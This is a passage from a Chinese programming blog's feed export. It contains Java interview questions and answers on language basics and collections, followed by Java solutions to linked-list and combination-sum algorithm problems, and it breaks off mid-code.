title="8.什么是值传递和引用传递？"></a>8.什么是值传递和引用传递？</h2><p>值传递是对基本型变量而言的,传递的是该变量的一个副本,改变副本不影响原变量. 引用传递一般是对于对象型变量而言的,传递的是该对象地址的一个副本, 并不是原对象本身 。 一般认为,java内的传递都是值传递. java中实例对象的传递是引用传递 。</p><h2 id="9-是否可以在static环境中访问非static变量？"><a href="#9-是否可以在static环境中访问非static变量？" class="headerlink" title="9.是否可以在static环境中访问非static变量？"></a>9.是否可以在static环境中访问非static变量？</h2><p>static变量在Java中是属于类的，它在所有的实例中的值是一样的。当类被Java虚拟机载入的时候，会对static变量进行初始化。如果你的代码尝试不用实例来访问非static的变量，编译器会报错，因为这些变量还没有被创建出来，还没有跟任何实例关联上。</p><h2 id="10-Java中的方法覆盖-Overriding-和方法重载-Overloading-是什么意思？"><a href="#10-Java中的方法覆盖-Overriding-和方法重载-Overloading-是什么意思？" class="headerlink" title="10.Java中的方法覆盖(Overriding)和方法重载(Overloading)是什么意思？"></a>10.Java中的方法覆盖(Overriding)和方法重载(Overloading)是什么意思？</h2><p>Java中的方法重载发生在同一个类里面两个或者是多个方法的方法名相同但是参数不同的情况。与此相对，方法覆盖是说子类重新定义了父类的方法。方法覆盖必须有相同的方法名，参数列表和返回类型。覆盖者可能不会限制它所覆盖的方法的访问。</p><h2 id="11-Java中，什么是构造方法？什么是构造方法重载？什么是复制构造方法？"><a href="#11-Java中，什么是构造方法？什么是构造方法重载？什么是复制构造方法？" class="headerlink" title="11.Java中，什么是构造方法？什么是构造方法重载？什么是复制构造方法？"></a>11.Java中，什么是构造方法？什么是构造方法重载？什么是复制构造方法？</h2><p>当新对象被创建的时候，构造方法会被调用。每一个类都有构造方法。在程序员没有给类提供构造方法的情况下，Java编译器会为这个类创建一个默认的构造方法。 Java中构造方法重载和方法重载很相似。可以为一个类创建多个构造方法。每一个构造方法必须有它自己唯一的参数列表。 Java不支持像C++中那样的复制构造方法，这个不同点是因为如果你不自己写构造方法的情况下，Java不会创建默认的复制构造方法。</p><h2 id="12-Java支持多继承么？"><a href="#12-Java支持多继承么？" class="headerlink" title="12.Java支持多继承么？"></a>12.Java支持多继承么？</h2><p>Java中类不支持多继承，只支持单继承（即一个类只有一个父类）。 但是java中的接口支持多继承，，即一个子接口可以有多个父接口。（接口的作用是用来扩展对象的功能，一个子接口继承多个父接口，说明子接口扩展了多个功能，当类实现接口时，类就扩展了相应的功能）。</p><h2 id="13-解释内存中的栈-stack-、堆-heap-和方法区-method-area-的用法。"><a href="#13-解释内存中的栈-stack-、堆-heap-和方法区-method-area-的用法。" class="headerlink" title="13.解释内存中的栈(stack)、堆(heap)和方法区(method area)的用法。"></a>13.解释内存中的栈(stack)、堆(heap)和方法区(method area)的用法。</h2><p>通常我们定义一个基本数据类型的变量，一个对象的引用，还有就是函数调用的现场保存都使用JVM中的栈空间；而通过new关键字和构造器创建的对象则放在堆空间，堆是垃圾收集器管理的主要区域，由于现在的垃圾收集器都采用分代收集算法，所以堆空间还可以细分为新生代和老生代，再具体一点可以分为Eden、Survivor（又可分为From Survivor和To Survivor）、Tenured；方法区和堆都是各个线程共享的内存区域，用于存储已经被JVM加载的类信息、常量、静态变量、JIT编译器编译后的代码等数据；程序中的字面量（literal）如直接书写的100、”hello”和常量都是放在常量池中，常量池是方法区的一部分，。栈空间操作起来最快但是栈很小，通常大量的对象都是放在堆空间，栈和堆的大小都可以通过JVM的启动参数来进行调整，栈空间用光了会引发StackOverflowError，而堆和常量池空间不足则会引发OutOfMemoryError。</p><h2 id="14-接口和抽象类的区别是什么？"><a href="#14-接口和抽象类的区别是什么？" class="headerlink" title="14.接口和抽象类的区别是什么？"></a>14.接口和抽象类的区别是什么？</h2><p>从设计层面来说，抽象是对类的抽象，是一种模板设计，接口是行为的抽象，是一种行为的规范。 Java提供和支持创建抽象类和接口。它们的实现有共同点，不同点在于： 接口中所有的方法隐含的都是抽象的。而抽象类则可以同时包含抽象和非抽象的方法。 类可以实现很多个接口，但是只能继承一个抽象类 类可以不实现抽象类和接口声明的所有方法，当然，在这种情况下，类也必须得声明成是抽象的。 抽象类可以在不提供接口方法实现的情况下实现接口。 Java接口中声明的变量默认都是final的。抽象类可以包含非final的变量。 Java接口中的成员函数默认是public的。抽象类的成员函数可以是private，protected或者是public。 接口是绝对抽象的，不可以被实例化。抽象类也不可以被实例化，但是，如果它包含main方法的话是可以被调用的。 也可以参考JDK8中抽象类和接口的区别。</p><h2 id="15-用最有效率的方法计算2乘以8？"><a href="#15-用最有效率的方法计算2乘以8？" class="headerlink" title="15.用最有效率的方法计算2乘以8？"></a>15.用最有效率的方法计算2乘以8？</h2><p>答： 2 &lt;&lt; 3（左移3位相当于乘以2的3次方，右移3位相当于除以2的3次方）。</p><h2 id="16-手写单例模式（饿汉和饱汉模式）和工厂模式？"><a href="#16-手写单例模式（饿汉和饱汉模式）和工厂模式？" class="headerlink" title="16.手写单例模式（饿汉和饱汉模式）和工厂模式？"></a>16.手写单例模式（饿汉和饱汉模式）和工厂模式？</h2><p>(1)单例饿汉模式://饿汉式单例类.在类初始化时，已经自行实例化</p><pre><code> public class Singleton1 {  //私有的默认构造子  private Singleton1() {}  //已经自行实例化  private static final Singleton1 single = new Singleton1();  //静态工厂方法  public static Singleton1 getInstance() {  return single;  }  }</code></pre><p>(2)懒汉模式://懒汉式单例类.在第一次调用的时候实例化</p><pre><code> public class Singleton2 {  //私有的默认构造子  private Singleton2() {}  //注意，这里没有final  private static Singleton2 single=null;  //静态工厂方法  public synchronized static Singleton2 getInstance() {  if (single == null) {  single = new Singleton2();  }  return single;  }  }</code></pre><p>(3)工厂模式:</p><pre><code>interface IFactory{  public IProduct createProduct();} Class Factory implements IFactory{  public IProduct createProduct(){ return new Product(); }} Public class client{ Public Static void main (String [] args){   IFactory factory=new Factory();    IProduct product=factory.createProduct();    product.ProductMethod();}}</code></pre><h2 id="17-String和StringBuilder、StringBuffer的区别？"><a href="#17-String和StringBuilder、StringBuffer的区别？" class="headerlink" title="17.String和StringBuilder、StringBuffer的区别？"></a>17.String和StringBuilder、StringBuffer的区别？</h2><p>Java平台提供了两种类型的字符串：String和StringBuffer/StringBuilder，它们可以储存和操作字符串。其中String是只读字符串，也就意味着String引用的字符串内容是不能被改变的。而StringBuffer/StringBuilder类表示的字符串对象可以直接进行修改。StringBuilder是Java 5中引入的，它和StringBuffer的方法完全相同，区别在于它是在单线程环境下使用的，因为它的所有方面都没有被synchronized修饰，因此它的效率也比StringBuffer要高。</p><h1 id="二、JAVA基础篇-集合与数组"><a href="#二、JAVA基础篇-集合与数组" class="headerlink" title="二、JAVA基础篇-集合与数组"></a>二、JAVA基础篇-集合与数组</h1><h2 id="18-Java集合框架是什么？说出一些集合框架的优点？"><a href="#18-Java集合框架是什么？说出一些集合框架的优点？" class="headerlink" title="18.Java集合框架是什么？说出一些集合框架的优点？"></a>18.Java集合框架是什么？说出一些集合框架的优点？</h2><p>每种编程语言中都有集合，最初的Java版本包含几种集合类：Vector、Stack、HashTable和Array。随着集合的广泛使用，Java1.2提出了囊括所有集合接口、实现和算法的集合框架。在保证线程安全的情况下使用泛型和并发集合类，Java已经经历了很久。它还包括在Java并发包中，阻塞接口以及它们的实现。集合框架的部分优点如下：</p><ul><li>（1）使用核心集合类降低开发成本，而非实现我们自己的集合类。</li><li>（2）随着使用经过严格测试的集合框架类，代码质量会得到提高。</li><li>（3）通过使用JDK附带的集合类，可以降低代码维护成本。</li><li>（4）复用性和可操作性。</li></ul><h2 id="19-集合框架中的泛型有什么优点？"><a href="#19-集合框架中的泛型有什么优点？" class="headerlink" title="19.集合框架中的泛型有什么优点？"></a>19.集合框架中的泛型有什么优点？</h2><p>Java1.5引入了泛型，所有的集合接口和实现都大量地使用它。泛型允许我们为集合提供一个可以容纳的对象类型，因此，如果你添加其它类型的任何元素，它会在编译时报错。这避免了在运行时出现ClassCastException，因为你将会在编译时得到报错信息。泛型也使得代码整洁，我们不需要使用显式转换和instanceOf操作符。它也给运行时带来好处，因为不会产生类型检查的字节码指令。</p><h2 id="20-Java集合框架的基础接口有哪些？"><a href="#20-Java集合框架的基础接口有哪些？" class="headerlink" title="20.Java集合框架的基础接口有哪些？"></a>20.Java集合框架的基础接口有哪些？</h2><p>Collection为集合层级的根接口。一个集合代表一组对象，这些对象即为它的元素。Java平台不提供这个接口任何直接的实现。## 标题 ## Set是一个不能包含重复元素的集合。这个接口对数学集合抽象进行建模，被用来代表集合，就如一副牌。 List是一个有序集合，可以包含重复元素。你可以通过它的索引来访问任何元素。List更像长度动态变换的数组。 Map是一个将key映射到value的对象.一个Map不能包含重复的key：每个key最多只能映射一个value。 一些其它的接口有Queue、Dequeue、SortedSet、SortedMap和ListIterator。</p><h2 id="21-为何Collection不从Cloneable和Serializable接口继承？"><a href="#21-为何Collection不从Cloneable和Serializable接口继承？" class="headerlink" title="21.为何Collection不从Cloneable和Serializable接口继承？"></a>21.为何Collection不从Cloneable和Serializable接口继承？</h2><p>Collection接口指定一组对象，对象即为它的元素。如何维护这些元素由Collection的具体实现决定。例如，一些如List的Collection实现允许重复的元素，而其它的如Set就不允许。很多Collection实现有一个公有的clone方法。然而，把它放到集合的所有实现中也是没有意义的。这是因为Collection是一个抽象表现。重要的是实现。 当与具体实现打交道的时候，克隆或序列化的语义和含义才发挥作用。所以，具体实现应该决定如何对它进行克隆或序列化，或它是否可以被克隆或序列化。 在所有的实现中授权克隆和序列化，最终导致更少的灵活性和更多的限制。特定的实现应该决定它是否可以被克隆和序列化。</p><h2 id="22-为何Map接口不继承Collection接口？"><a href="#22-为何Map接口不继承Collection接口？" class="headerlink" title="22.为何Map接口不继承Collection接口？"></a>22.为何Map接口不继承Collection接口？</h2><p>尽管Map接口和它的实现也是集合框架的一部分，但Map不是集合，集合也不是Map。因此，Map继承Collection毫无意义，反之亦然。 如果Map继承Collection接口，那么元素去哪儿？Map包含key-value对，它提供抽取key或value列表集合的方法，但是它不适合“一组对象”规范。</p><h2 id="23-什么是迭代器-Iterator-？"><a href="#23-什么是迭代器-Iterator-？" class="headerlink" title="23.什么是迭代器(Iterator)？"></a>23.什么是迭代器(Iterator)？</h2><p>Iterator接口提供了很多对集合元素进行迭代的方法。每一个集合类都包含了可以返回迭代器实例的迭代方法。迭代器可以在迭代的过程中删除底层集合的元素,但是不可以直接调用集合的remove(Object Obj)删除，可以通过迭代器的remove()方法删除。</p><h2 id="24-Iterator和ListIterator的区别是什么？"><a href="#24-Iterator和ListIterator的区别是什么？" class="headerlink" title="24.Iterator和ListIterator的区别是什么？"></a>24.Iterator和ListIterator的区别是什么？</h2><p>下面列出了他们的区别： Iterator可用来遍历Set和List集合，但是ListIterator只能用来遍历List。 Iterator对集合只能是前向遍历，ListIterator既可以前向也可以后向。 ListIterator实现了Iterator接口，并包含其他的功能，比如：增加元素，替换元素，获取前一个和后一个元素的索引，等等。</p><h2 id="25-快速失败-fail-fast-和安全失败-fail-safe-的区别是什么？"><a href="#25-快速失败-fail-fast-和安全失败-fail-safe-的区别是什么？" class="headerlink" title="25.快速失败(fail-fast)和安全失败(fail-safe)的区别是什么？"></a>25.快速失败(fail-fast)和安全失败(fail-safe)的区别是什么？</h2><p>快速失败：当你在迭代一个集合的时候，如果有另一个线程正在修改你正在访问的那个集合时，就会抛出一个ConcurrentModification异常。 在java.util包下的都是快速失败。 安全失败：你在迭代的时候会去底层集合做一个拷贝，所以你在修改上层集合的时候是不会受影响的，不会抛出ConcurrentModification异常。 在java.util.concurrent包下的全是安全失败的。</p><h2 id="26-Java中的HashMap的工作原理是什么？"><a href="#26-Java中的HashMap的工作原理是什么？" class="headerlink" title="26.Java中的HashMap的工作原理是什么？"></a>26.Java中的HashMap的工作原理是什么？</h2><p>我们知道在Java中最常用的两种结构是数组和模拟指针(引用)，几乎所有的数据结构都可以利用这两种来组合实现，HashMap也是如此。实际上HashMap是一个“链表散列”，如下是它数据结构：最左侧是一个数组，数组中的每一个元素都是一个链表，链表的每一个元素都是entry。</p><p>HashMap是基于hashing的原理，我们使用put(key, value)存储对象到HashMap中，使用get(key)从HashMap中获取对象。当我们给put()方法传递键和值时，我们先对键调用hashCode()方法，返回的hashCode用于找到bucket位置来储存Entry对象。</p><h2 id="27-当两个对象的hashcode相同会发生什么？"><a href="#27-当两个对象的hashcode相同会发生什么？" class="headerlink" title="27.当两个对象的hashcode相同会发生什么？"></a>27.当两个对象的hashcode相同会发生什么？</h2><p>因为hashcode相同，所以它们的bucket位置相同，‘碰撞’会发生。因为HashMap使用链表存储对象，这个Entry(包含有键值对的Map.Entry对象)会存储在链表中。</p><h2 id="28-如果两个键的hashcode相同，你如何获取值对象？"><a href="#28-如果两个键的hashcode相同，你如何获取值对象？" class="headerlink" title="28.如果两个键的hashcode相同，你如何获取值对象？"></a>28.如果两个键的hashcode相同，你如何获取值对象？</h2><p>当我们调用get()方法，HashMap会使用键对象的hashcode找到bucket位置，然后会调用keys.equals()方法去找到链表中正确的节点，最终找到要找的值对象。</p><h2 id="29-hashCode-和equals-方法有何重要性？"><a href="#29-hashCode-和equals-方法有何重要性？" class="headerlink" title="29.hashCode()和equals()方法有何重要性？"></a>29.hashCode()和equals()方法有何重要性？</h2><p>HashMap使用Key对象的hashCode()和equals()方法去决定key-value对的索引。当我们试着从HashMap中获取值的时候，这些方法也会被用到。如果这些方法没有被正确地实现，在这种情况下，两个不同Key也许会产生相同的hashCode()和equals()输出，HashMap将会认为它们是相同的，然后覆盖它们，而非把它们存储到不同的地方。同样的，所有不允许存储重复数据的集合类都使用hashCode()和equals()去查找重复，所以正确实现它们非常重要。equals()和hashCode()的实现应该遵循以下规则：</p><ul><li>（1）如果o1.equals(o2)，那么o1.hashCode() == o2.hashCode()总是为true的。</li><li>（2）如果o1.hashCode() == o2.hashCode()，并不意味着o1.equals(o2)会为true。 具体可以参考 <a href="http://blog.csdn.net/javazejian/article/details/51348320" target="_blank" rel="noopener">http://blog.csdn.net/javazejian/article/details/51348320</a></li></ul><h2 id="30-HashMap和Hashtable有什么区别？"><a href="#30-HashMap和Hashtable有什么区别？" class="headerlink" title="30.HashMap和Hashtable有什么区别？"></a>30.HashMap和Hashtable有什么区别？</h2><ul><li>1、HashMap是非线程安全的，HashTable是线程安全的。</li><li>2、HashMap的键和值都允许有null值存在，而HashTable则不行。</li><li>3、因为线程安全的问题，HashMap效率比HashTable的要高。</li><li>4、Hashtable是同步的，而HashMap不是。因此，HashMap更适合于单线程环境，而Hashtable适合于多线程环境。 一般现在不建议用HashTable, ①是HashTable是遗留类，内部实现很多没优化和冗余。②即使在多线程环境下，现在也有同步的ConcurrentHashMap替代，没有必要因为是多线程而用HashTable。</li></ul><h2 id="31-如何决定选用HashMap还是TreeMap？"><a href="#31-如何决定选用HashMap还是TreeMap？" class="headerlink" title="31.如何决定选用HashMap还是TreeMap？"></a>31.如何决定选用HashMap还是TreeMap？</h2><p>对于在Map中插入、删除和定位元素这类操作，HashMap是最好的选择。然而，假如你需要对一个有序的key集合进行遍历，TreeMap是更好的选择。基于你的collection的大小，也许向HashMap中添加元素会更快，将map换为TreeMap进行有序key的遍历。</p><h2 id="32-ArrayList和Vector有何异同点？"><a href="#32-ArrayList和Vector有何异同点？" class="headerlink" title="32.ArrayList和Vector有何异同点？"></a>32.ArrayList和Vector有何异同点？</h2><p>ArrayList和Vector在很多时候都很类似。</p><ul><li>（1）两者都是基于索引的，内部由一个数组支持。</li><li>（2）两者维护插入的顺序，我们可以根据插入顺序来获取元素。</li><li>（3）ArrayList和Vector的迭代器实现都是fail-fast的。</li><li>（4）ArrayList和Vector两者允许null值，也可以使用索引值对元素进行随机访问。 以下是ArrayList和Vector的不同点。</li><li>（1）Vector是同步的，而ArrayList不是。然而，如果你寻求在迭代的时候对列表进行改变，你应该使用CopyOnWriteArrayList。</li><li>（2）ArrayList比Vector快，它因为有同步，不会过载。</li><li>（3）ArrayList更加通用，因为我们可以使用Collections工具类轻易地获取同步列表和只读列表。</li></ul><h2 id="33-Array和ArrayList有何区别？什么时候更适合用Array？"><a href="#33-Array和ArrayList有何区别？什么时候更适合用Array？" class="headerlink" title="33.Array和ArrayList有何区别？什么时候更适合用Array？"></a>33.Array和ArrayList有何区别？什么时候更适合用Array？</h2><p>Array可以容纳基本类型和对象，而ArrayList只能容纳对象。 Array是指定大小的，而ArrayList大小是固定的。 Array没有提供ArrayList那么多功能，比如addAll、removeAll和iterator等。尽管ArrayList明显是更好的选择，但也有些时候Array比较好用。</p><ul><li>（1）如果列表的大小已经指定，大部分情况下是存储和遍历它们。</li><li>（2）对于遍历基本数据类型，尽管Collections使用自动装箱来减轻编码任务，在指定大小的基本类型的列表上工作也会变得很慢。</li><li>（3）如果你要使用多维数组，使用[][]比List</li></ul><p>本文转载自:  <a href="https://mp.weixin.qq.com/s/FCZejw_eeOEWCLmgnVNiww" target="_blank" rel="noopener">原文</a></p>]]></content>
      
      
      <categories>
          
          <category> 面试系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反转单链表2</title>
      <link href="/2019/02/20/suan-fa/lian-biao/fan-zhuan-dan-lian-biao-2/"/>
      <url>/2019/02/20/suan-fa/lian-biao/fan-zhuan-dan-lian-biao-2/</url>
      
        <content type="html"><![CDATA[<h2 id="反转单链表2"><a href="#反转单链表2" class="headerlink" title="反转单链表2"></a>反转单链表2</h2><p><strong>问题</strong></p><p>反转从位置 m 到 n 的链表。请使用一趟扫描完成反转。</p><pre><code>1 &lt;= m &lt;= n &lt;= 链表长度。输入: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL, m = 2, n = 4输出: 1-&gt;4-&gt;3-&gt;2-&gt;5-&gt;NULL</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> ListNode <span class="token function">reverseBetween</span><span class="token punctuation">(</span>ListNode head<span class="token punctuation">,</span> <span class="token keyword">int</span> m<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>head <span class="token operator">==</span> null <span class="token operator">||</span> head<span class="token punctuation">.</span>next <span class="token operator">==</span> null <span class="token operator">||</span> m <span class="token operator">==</span> n<span class="token punctuation">)</span>            <span class="token keyword">return</span> head<span class="token punctuation">;</span>        ListNode normal <span class="token operator">=</span> head<span class="token punctuation">,</span> last <span class="token operator">=</span> null<span class="token punctuation">,</span> pre<span class="token punctuation">,</span> cur<span class="token punctuation">,</span> dummy <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ListNode</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        dummy<span class="token punctuation">.</span>next <span class="token operator">=</span> head<span class="token punctuation">;</span>        pre <span class="token operator">=</span> dummy<span class="token punctuation">;</span>        cur <span class="token operator">=</span> head<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>cur <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>m <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                normal <span class="token operator">=</span> cur<span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 链表反转,头拼接</span>                last <span class="token operator">=</span> <span class="token function">reverseList</span><span class="token punctuation">(</span>cur<span class="token punctuation">,</span> pre<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 尾拼接</span>                normal<span class="token punctuation">.</span>next <span class="token operator">=</span> last<span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>next<span class="token punctuation">;</span>            pre <span class="token operator">=</span> pre<span class="token punctuation">.</span>next<span class="token punctuation">;</span>            m<span class="token operator">--</span><span class="token punctuation">;</span>            n<span class="token operator">--</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> dummy<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 反转链表工具方法,反转当前节点与之后n个节点的子链表,头拼接</span>    <span class="token keyword">public</span> ListNode <span class="token function">reverseList</span><span class="token punctuation">(</span>ListNode head<span class="token punctuation">,</span> ListNode first<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>        ListNode pre <span class="token operator">=</span> null<span class="token punctuation">;</span>        ListNode next <span class="token operator">=</span> head<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>n <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            ListNode tmp <span class="token operator">=</span> next<span class="token punctuation">.</span>next<span class="token punctuation">;</span>            next<span class="token punctuation">.</span>next <span class="token operator">=</span> pre<span class="token punctuation">;</span>            pre <span class="token operator">=</span> next<span class="token punctuation">;</span>            next <span class="token operator">=</span> tmp<span class="token punctuation">;</span>            n<span class="token operator">--</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        first<span class="token punctuation">.</span>next <span class="token operator">=</span> pre<span class="token punctuation">;</span>        <span class="token keyword">return</span> next<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>删除链表节点</title>
      <link href="/2019/02/20/suan-fa/lian-biao/shan-chu-lian-biao-jie-dian/"/>
      <url>/2019/02/20/suan-fa/lian-biao/shan-chu-lian-biao-jie-dian/</url>
      
        <content type="html"><![CDATA[<h2 id="删除链表节点"><a href="#删除链表节点" class="headerlink" title="删除链表节点"></a>删除链表节点</h2><p><strong>问题</strong></p><p>这个题目说的是，你要写一个函数来删除单链表中的一个节点，并且<strong>只给你指向那个节点的指针</strong>。其中，<strong>这个单链表至少有两个节点，并且不会要求你删除尾节点。</strong></p><pre><code>比如说，给你的单链表是：0 -&gt; 1 -&gt; 2 -&gt; 4 -&gt; 8同时给你一个指针 p，指向节点 2：0 -&gt; 1 -&gt; 2 -&gt; 4 -&gt; 8          p删除节点 2 后，这条链表变成：0 -&gt; 1 -&gt; 4 -&gt; 8</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ListNode</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    ListNode next<span class="token punctuation">;</span>    <span class="token function">ListNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>      val <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(1), Space: O(1)</span>  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">deleteNode</span><span class="token punctuation">(</span>ListNode node<span class="token punctuation">)</span> <span class="token punctuation">{</span>    node<span class="token punctuation">.</span>val <span class="token operator">=</span> node<span class="token punctuation">.</span>next<span class="token punctuation">.</span>val<span class="token punctuation">;</span>    node<span class="token punctuation">.</span>next <span class="token operator">=</span> node<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>求和为给定值的组合</title>
      <link href="/2019/02/17/suan-fa/qiu-he-wei-gei-ding-zhi-de-zu-he/"/>
      <url>/2019/02/17/suan-fa/qiu-he-wei-gei-ding-zhi-de-zu-he/</url>
      
        <content type="html"><![CDATA[<h1 id="求和为给定值的组合"><a href="#求和为给定值的组合" class="headerlink" title="求和为给定值的组合"></a>求和为给定值的组合</h1><p><strong>题目描述</strong><br>这个题目说的是，给你一个<strong>正整数数组</strong>，数组中<strong>不包含重复元素</strong>，同时给你一个<strong>正整数目标值</strong>，你要找到数组中和为目标值的所有组合。另外，数组中每个元素都可以使用无限多次，并且答案中不能包含重复组合。</p><pre><code>比如说，给你的数组是：4, 2, 8给你的目标值是 6。数组中和为 6 的组合有：[4, 2][2, 2, 2]</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">combSum</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> target<span class="token punctuation">,</span> <span class="token keyword">int</span> start<span class="token punctuation">,</span>                       List<span class="token operator">&lt;</span>Integer<span class="token operator">></span> elem<span class="token punctuation">,</span> List<span class="token operator">&lt;</span>List<span class="token operator">&lt;</span>Integer<span class="token operator">>></span> result<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>target <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      result<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>elem<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>target <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> start<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>      elem<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">combSum</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> target<span class="token operator">-</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> elem<span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span>      elem<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>elem<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// T: O(1)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n^(target/min)), Space: O(target/min)</span>  <span class="token keyword">public</span> List<span class="token operator">&lt;</span>List<span class="token operator">&lt;</span>Integer<span class="token operator">>></span> <span class="token function">combinationSum</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> candidates<span class="token punctuation">,</span> <span class="token keyword">int</span> target<span class="token punctuation">)</span> <span class="token punctuation">{</span>    List<span class="token operator">&lt;</span>List<span class="token operator">&lt;</span>Integer<span class="token operator">>></span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    List<span class="token operator">&lt;</span>Integer<span class="token operator">></span> elem <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">combSum</span><span class="token punctuation">(</span>candidates<span class="token punctuation">,</span> target<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> elem<span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">combSumSort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> target<span class="token punctuation">,</span> <span class="token keyword">int</span> start<span class="token punctuation">,</span>                           List<span class="token operator">&lt;</span>Integer<span class="token operator">></span> elem<span class="token punctuation">,</span> List<span class="token operator">&lt;</span>List<span class="token operator">&lt;</span>Integer<span class="token operator">>></span> result<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>target <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      result<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token 